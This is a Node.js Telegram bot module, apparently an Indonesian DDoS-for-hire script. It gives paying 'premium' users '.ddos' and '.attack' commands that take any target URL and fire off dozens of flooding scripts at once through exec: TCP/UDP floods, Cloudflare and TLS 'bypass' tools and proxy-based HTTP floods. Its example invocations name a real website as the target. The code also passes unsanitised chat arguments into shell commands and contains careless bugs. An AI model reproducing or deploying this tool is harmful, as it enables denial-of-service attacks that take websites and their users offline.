/*
  ( Base Ori WannOFFC°GhostMods°YUDAMODS )

Script Ini Murni Bikinan Sendiri, Saya Hanya Sekedar Kroco Penghuni Inti Bumi.

Note : 
• Jangan Membagikan Script Ini Secara Free !!
• Jangan Mengganti Name Developer Script !!
• Jangan Menjual Script Ini Di Atas Harga Yang Saya Jual !!

Thanks To :                                
- Allah Swt 
- Nabi Muhammad Saw         
- My Team
- WannOFFC   :   [ My Self ] 
- YUDAMODS       [ Support ]
- Ghost       :    [ Support ] 
- Pengguna Bot Yang Selalu Support

• Recode By ( Nama Mu )
*/
const fs = require('fs');
const temporUsersFile = 'database/ddosUsers.json';
const adminfile = 'database/AdminFel.json';
const premiumUsersFile = 'database/PremiumFile.json';
const settings = require('../config')
const owner = settings.adminId;
const nama = 'sc cαmpurαn v1.0';
const ytc = 'Yuda σffícíαl х dєvєlσpєr';
const author = 'Yuda σffícíαl х dєvєlσpєr';
const version = '1.0.0';
const runningProcesses = {};
const { exec } = require('child_process');
try {
  premiumUsers = JSON.parse(fs.readFileSync(premiumUsersFile));
} catch (error) {
  console.error('Error reading premiumUsers file:', error);
  }
try {
  temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  } catch (error) {
      console.error('Error reading temporUsers file:', error);
  }
try {
  adminUsers = JSON.parse(fs.readFileSync(adminfile));
  } catch (error) {
  console.error('Error reading adminUsers file:', error);
  }
// getRuntime
function getRuntime(startTime) {
    const uptime = process.uptime();
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);
    return `${hours} Jam ${minutes} Menit ${seconds} Detik`;
}
// Informasi waktu mulai bot
const startTime = Date.now();
async function ddosHandler(bot) {

// Handle command '/ddos'
bot.onText(/\.ddos/, (msg) => {
    const chatId = msg.chat.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/); 
    
    if (runningProcesses[chatId]) {
    
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
    bot.sendPhoto(chatId, settings.menu, {
            caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ there is still an ongoing process
 
 ∘ type .ddosstop to terminate

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
        });
    } else {
        if (args.length !== 6) {
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
            bot.sendPhoto(chatId, settings.menu, {
                caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ use .ddos (url) (time) (rate) (therad) (timerdelay)
 
 ∘ ex: .ddos www.xnxx.com 999 99 9 9

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
            });
        } else {
    const url = args[1];
    const time = args[2];
    const thread = args[3];
    const rate = args[4];
    const timeHours = parseInt(args[5]); // Mengonversi string waktu menjadi bilangan bulat

            if (isNaN(timeHours)) {
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
                bot.sendPhoto(chatId, settings.menu, {
                    caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ use .ddos (url) (time) (rate) (therad) (timerdelay)
 
 ∘ ex: .ddos www.xnxx.com 999 99 9 9

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
                });
            } else {
                const cmzs = `node plugins/data/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`;
                exec(cmzs);
                const gojk = `node plugins/data/gojov21.js ${url} ${time} 20 8 proxy.txt`;
                exec(gojk);
                const kss = `node plugins/data/UDP.js ${url} 22 ${time} 999 ${thread}`;
                exec(kss);
                const cm = `node plugins/data/mix.js ${url} ${time} ${thread} ${rate}`;
                exec(cm);
                const cms = `node plugins/data/TCP.js ${url}/ ${time} 22`;
                exec(cms);
                const cxm = `node plugins/data/PASSWELL.js ${url} ${time} 32 ${thread} proxy.txt`;
                exec(cxm);
                const cmd = `node plugins/data/MIXMAX.js ${url} ${time} ${rate} ${thread}`;
                exec(cmd);
                const cds = `node plugins/data/CFbypass.js ${url} ${time}`;
                exec(cds);
                const ags = `node plugins/data/TLS-BYPASS.js ${url} ${time} ${rate} ${thread}`;
                exec(ags);
                const ats = `node plugins/data/UAM.js ${url} ${time} ${rate} ${thread} proxy.txt`;
                exec(ats);
                const cmzss = `node plugins/data/tlsvip.js ${url} ${time} ${rate} ${thread} proxyc.txt`;
                exec(cmzss);
                const gojks = `node plugins/data/gojov21.js ${url} ${time} 90 28 proxyc.txt`;
                exec(gojks);
                const ksss = `node plugins/data/UDP.js ${url} 24 ${time} 9909 ${thread}`;
                exec(ksss);
                const cmdd = `node plugins/data/mix.js ${url} ${time} ${thread} ${rate}`;
                exec(cmdd);
                const cmsaa = `node plugins/data/TCP.js ${url}/ ${time} 24`;
                exec(cmsaa);
                const cxmas = `node plugins/data/PASSWELL.js ${url} ${time} 39 ${thread} proxyc.txt`;
                exec(cxmas);
                const cmddd = `node plugins/data/MIXMAX.js ${url} ${time} ${rate} ${thread}`;
                exec(cmddd);
                const cds2 = `node plugins/data/CFbypass.js ${url} ${time}`;
                exec(cds2);
                const agsas = `node plugins/data/TLS-BYPASS.js ${url} ${time} ${rate} ${thread}`;
                exec(agsas);
                const atssss = `node plugins/data/UAM.js ${url} ${time} ${rate} ${thread} proxyc.txt`;
                exec(atssss);
const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
                bot.sendPhoto(chatId, settings.menu, {
                    caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ target: [DDOS ATTACK TO](${url})
 
 ∘ status: [Status](https://check-host.net/check-http?host=${url}&csrf_token=)

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
                });
                runningProcesses[chatId] = true;

                setTimeout(() => {
                    delete runningProcesses[chatId];
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
                    bot.sendPhoto(chatId, settings.menu, {
                        caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ target: [DDOS ATTACK TO](${url})
 
 ∘ status: [Status](https://check-host.net/check-http?host=${url}&csrf_token=)

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
                    });
                }, timeHours * 60 * 60 * 1000);
            }
        }
    }
});

// Handle command '/temp'
bot.onText(/\.attack/, (msg) => {
    const chatId = msg.chat.id;
    const usr = msg.from.username;
    const args = msg.text.split(/\s+/); 
    
    if (runningProcesses[chatId]) {
    
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
    bot.sendPhoto(chatId, settings.menu, {
            caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ there is still an ongoing process
 
 ∘ type .ddosstop to terminate

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
        });
    } else {
        if (args.length !== 6) {
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
            bot.sendPhoto(chatId, settings.menu, {
                caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ use .attack (url) (time) (rate) (therad) (timerdelay)
 
 ∘ ex: .attack www.xnxx.com 999 99 9 9

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
            });
        } else {
    const url = args[1];
    const time = args[2];
    const thread = args[3];
    const rate = args[4];
    const timeHours = parseInt(args[5]); // Mengonversi string waktu menjadi bilangan bulat

            if (isNaN(timeHours)) {
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
                bot.sendPhoto(chatId, settings.menu, {
                    caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ use .attack (url) (time) (rate) (therad) (timerdelay)
 
 ∘ ex: .attack www.xnxx.com 999 99 9 9

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
                });
            } else {
               const cmzs = `node plugins/data/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`;
                exec(cmzs);
                const gojk = `node plugins/data/gojov21.js ${url} ${time} 90 8 proxy.txt`;
                exec(gojk);
                const cm = `node plugins/data/mix.js ${url} ${time} ${thread} ${rate}`;
                exec(cm);
                const cxm = `node plugins/data/PASSWELL.js ${url} ${time} 50 ${thread} proxy.txt`;
                exec(cxm);
                const cmd = `node plugins/data/MIXMAX.js ${url} ${time} ${rate} ${thread}`;
                exec(cmd);
                const cds = `node plugins/data/CFbypass.js ${url} ${time}`;
                exec(cds);
                const ags = `node plugins/data/TLS-BYPASS.js ${url} ${time} ${rate} ${thread}`;
                exec(ags);
                const ats = `node plugins/data/UAM.js ${url} ${time} ${rate} ${thread} proxy.txt`;
                exec(ats);
                const cmzss = `node plugins/data/tlsvip.js ${url} ${time} ${rate} ${thread} proxyc.txt`;
                exec(cmzss);
                const gojks = `node plugins/data/gojov21.js ${url} ${time} 90 50 proxyc.txt`;
                exec(gojks);
                const ksss = `node plugins/data/UDP.js ${url} 24 ${time} 99999 ${thread}`;
                exec(ksss);
                const cmsaa = `node plugins/data/TCP.js ${url}/ ${time} 22`;
                exec(cmsaa);
                const cms = `node plugins/data/TCP.js ${url}/ ${time} 88`;
                exec(cms1);
                const kss1 = `node plugins/data/UDP.js ${url} 80 ${time} 9999 ${thread}`;
                exec(kss1);
                const ksss1 = `node plugins/data/UDP.js ${url} 22 ${time} 99999 ${thread}`;
                exec(ksss1);
                const cmsaa1 = `node plugins/data/TCP.js ${url}/ ${time} 20`;
                exec(cmsaa1);
                const cms1 = `node plugins/data/TCP.js ${url}/ ${time} 80`;
                exec(cms1);
                const kss = `node plugins/data/UDP.js ${url} 88 ${time} 9999 ${thread}`;
                exec(kss);
                const cmdd = `node plugins/data/mix.js ${url} ${time} ${thread} ${rate}`;
                exec(cmdd);
                const cxmas = `node plugins/data/PASSWELL.js ${url} ${time} 39 ${thread} proxyc.txt`;
                exec(cxmas);
                const cmddd = `node plugins/data/MIXMAX.js ${url} ${time} ${rate} ${thread}`;
                exec(cmddd);
                const cds2 = `node plugins/data/CFbypass.js ${url} ${time}`;
                exec(cds2);
                const agsas = `node plugins/data/TLS-BYPASS.js ${url} ${time} ${rate} ${thread}`;
                exec(agsas);
                const atssss = `node plugins/data/UAM.js ${url} ${time} ${rate} ${thread} proxyc.txt`;
                exec(atssss);
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
                bot.sendPhoto(chatId, settings.menu, {
                    caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ target: [DDOS ATTACK TO](${url})
 
 ∘ status: [Status](https://check-host.net/check-http?host=${url}&csrf_token=)

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
                });
                runningProcesses[chatId] = true;

                setTimeout(() => {
                    delete runningProcesses[chatId];
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
                    bot.sendPhoto(chatId, settings.menu, {
                        caption: `
┏━━ 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨 ━⊜
╔╗──╔╦╗─╔╦═══╦═══╗
║╚╗╔╝║║─║╠╗╔╗║╔═╗║
╚╗╚╝╔╣║─║║║║║║║─║║
─╚╗╔╝║║─║║║║║║╚═╝║
──║║─║╚═╝╠╝╚╝║╔═╗║
──╚╝─╚═══╩═══╩╝─╚╝
╔═╗╔═╦═══╦═══╦═══╗
║║╚╝║║╔═╗╠╗╔╗║╔═╗║
║╔╗╔╗║║─║║║║║║╚══╗
║║║║║║║─║║║║║╠══╗║
║║║║║║╚═╝╠╝╚╝║╚═╝║
╚╝╚╝╚╩═══╩═══╩═══╝
╭ 🤖 nαmα вσt : ${nama}
 ∘ 👤αuthσr вσt : ${author}
 
╭  ◦ crєαtσr: ${author}
 ∘  ◦ чσutuвє: ${ytc}
╰  ◦ cσntαct: @YUDAMODSZX
┗━━━━━━━━━━━━━━
 ∘  ◦ Hi @${usr}

 ∘ target: [DDOS ATTACK TO](${url})
 
 ∘ status: [Status](https://check-host.net/check-http?host=${url}&csrf_token=)

 ∘ developer: @YUDAMODSZX
 
 ∘ nσtє :
scrípt mαsíh dαlαm pєngєmвαngαn, 
mααf jíkα αdα fítur чαng єrσr👋
┗━━━━━━━━━━━━━━━━`
                    });
                }, timeHours * 60 * 60 * 1000);
            }
        }
    }
});


// Handle command '/stop'
bot.onText(/.ddostop/, (msg) => {
    const chatId = msg.chat.id;
    const usr = msg.from.username;
    
    if (runningProcesses[chatId]) {
    
    const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
    const istemp = temporUsers.includes(String(msg.from.id));
    if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
        delete runningProcesses[chatId];
      exec("pkill -f plugins/data/CFbypass.js");
      exec("pkill -f plugins/data/TLS-BYPASS.js");
      exec("pkill -f plugins/data/UAM.js");
      exec("pkill -f plugins/data/gojov21.js");
      exec("pkill -f plugins/data/UDP.js");
      exec("pkill -f plugins/data/tlsvip.js");
      exec("pkill -f plugins/data/mix.js");
      exec("pkill -f plugins/data/TCP.js");
      exec("pkill -f plugins/data/PASSWELL.js");
        bot.sendPhoto(chatId, settings.profile, {
            caption: `
Hallo @${usr}👋 Ini Adalah Program Bot Telegram Campuran Version 2.0
           
 • 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨
╭  ☍ nαmαвσt  : ${nama}
  ∘ ☍ αuthσrвσt : ${author}
  ∘ ☍ vєrsíσnвσt : ${version}
╰  ☍ runtímє   : ${getRuntime(startTime)}

 ∘ Process Has Been Terminated

 ∘ developer: @YUDAMODSZX
 
fσund α вug? plєαsє rєpσrt thє dєvєlσpєr.
cσntαct thє σwnєr : @YUDAMODSZX`
        });
    } else {
  const temporUsers = JSON.parse(fs.readFileSync(temporUsersFile));
  const istemp = temporUsers.includes(String(msg.from.id));
  if (!istemp) {
    bot.sendMessage(chatId, 'Perintah Hanya Untuk Users Premium, Hubungi Admin Saya Untuk Menjadi Users Premium...', {
      reply_markup: {
        inline_keyboard: [
          [
            { text: 'HUBUNGI ADMIN', url: 'https://t.me/YUDAMODSZX' }
          ]
        ]
      }
    });
    return;
  }
      exec("pkill -f plugins/data/CFbypass.js");
      exec("pkill -f plugins/data/TLS-BYPASS.js");
      exec("pkill -f plugins/data/UAM.js");
      exec("pkill -f plugins/data/gojov21.js");
      exec("pkill -f plugins/data/UDP.js");
      exec("pkill -f plugins/data/tlsvip.js");
      exec("pkill -f plugins/data/mix.js");
      exec("pkill -f plugins/data/TCP.js");
      exec("pkill -f plugins/data/PASSWELL.js");
        bot.sendPhoto(chatId, settings.profile, {
            caption: `Hallo @${usr}👋 Ini Adalah Program Bot Telegram Campuran Version 2.0
           
 • 𝗜𝗡𝗙𝗢 𝗠𝗘𝗡𝗨
╭  ☍ nαmαвσt  : ${nama}
  ∘ ☍ αuthσrвσt : ${author}
  ∘ ☍ vєrsíσnвσt : ${version}
╰  ☍ runtímє   : ${getRuntime(startTime)}

 ∘ There are no processes running
 
 ∘ developer: @YUDAMODSZX
 
fσund α вug? plєαsє rєpσrt thє dєvєlσpєr.
cσntαct thє σwnєr : @YUDAMODSZX`
        });
    }
});

// Handle command '/addtemp'
bot.onText(/\.addddos (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];
    
    if (msg.from.id.toString() === owner) {
        if (!temporUsers.includes(userId)) {
            temporUsers.push(userId);
            fs.writeFileSync(temporUsersFile, JSON.stringify(temporUsers));
            bot.sendMessage(chatId, `User ${userId} has been added to premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is already a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

// Handle command '/delddos'
bot.onText(/\.delddos (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = match[1];  
    if (msg.from.id.toString() === owner) {
        const index = temporUsers.indexOf(userId);
        if (index !== -1) {
            temporUsers.splice(index, 1);
            fs.writeFileSync(temporUsersFile, JSON.stringify(temporUsers));
            bot.sendMessage(chatId, `User ${userId} has been removed from premium users.`);
        } else {
            bot.sendMessage(chatId, `User ${userId} is not a premium user.`);
        }
    } else {
        bot.sendMessage(chatId, 'Only the owner can perform this action.');
    }
});

}
        
module.exports = ddosHandler;